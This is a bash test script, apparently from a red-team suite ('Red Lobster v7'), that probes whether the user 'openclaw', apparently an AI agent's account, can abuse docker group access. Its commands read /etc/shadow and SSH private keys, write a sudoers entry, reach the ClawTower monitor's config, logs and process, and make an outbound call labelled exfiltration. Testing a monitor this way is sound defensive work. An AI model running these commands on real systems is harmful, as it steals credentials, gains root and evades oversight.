#!/usr/bin/env bash
# Red Lobster v7 — Flag 14: DOCKER — openclaw is in the docker group
# This is essentially root-equivalent access. NO sudo needed.
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/redlobster-lib.sh"

rl_init_flag "flag14" "Flag 14: DOCKER — Container-based privilege escalation"

OUTDIR="$FLAG_DIR"

# 1. Read /etc/shadow via container
rl_run "docker read /etc/shadow" \
  "docker run --rm -v /etc/shadow:/tmp/s:ro alpine cat /tmp/s > $OUTDIR/14_1.txt 2>/dev/null"

# 2. Read ClawTower config
rl_run "docker read ClawTower config" \
  "docker run --rm -v /etc/clawtower:/ct:ro alpine cat /ct/config.toml > $OUTDIR/14_2.txt 2>/dev/null"

# 3. Read ClawTower alert log
rl_run "docker read alert log" \
  "docker run --rm -v /var/log/clawtower:/logs:ro alpine head -20 /logs/alerts.jsonl > $OUTDIR/14_3.txt 2>/dev/null"

# 4. Read audit chain
rl_run "docker read audit chain" \
  "docker run --rm -v /var/log/clawtower:/logs:ro alpine head -20 /logs/audit.chain > $OUTDIR/14_4.txt 2>/dev/null"

# 5. Mount entire host filesystem
rl_run "docker mount / (full host)" \
  "docker run --rm -v /:/host:ro alpine ls /host/root/ > $OUTDIR/14_5.txt 2>/dev/null"

# 6. Privileged container (full kernel access)
rl_run "docker --privileged" \
  "docker run --rm --privileged alpine id > $OUTDIR/14_6.txt 2>/dev/null"

# 7. Docker write to /etc/sudoers (root write via container)
rl_run "docker write /etc/sudoers" \
  "docker run --rm -v /etc:/hostetc alpine sh -c 'echo openclaw ALL=NOPASSWD:ALL >> /hostetc/sudoers.rl7test' 2>/dev/null; rm -f /etc/sudoers.rl7test 2>/dev/null; docker run --rm -v /etc:/hostetc alpine rm -f /hostetc/sudoers.rl7test 2>/dev/null"

# 8. Docker disable ClawTower (stop its binary)
rl_run "docker kill ClawTower process" \
  "docker run --rm --pid=host alpine kill -0 1 > $OUTDIR/14_8.txt 2>/dev/null"

# 9. Docker read SSH keys
rl_run "docker read SSH private keys" \
  "docker run --rm -v /home/openclaw/.ssh:/ssh:ro alpine cat /ssh/id_ed25519 > $OUTDIR/14_9.txt 2>/dev/null"

# 10. Docker network exfil (bypasses host iptables)
rl_run "docker network exfil" \
  "docker run --rm alpine wget -q -O- http://ifconfig.me > $OUTDIR/14_10.txt 2>/dev/null"

rl_summary
rl_cleanup
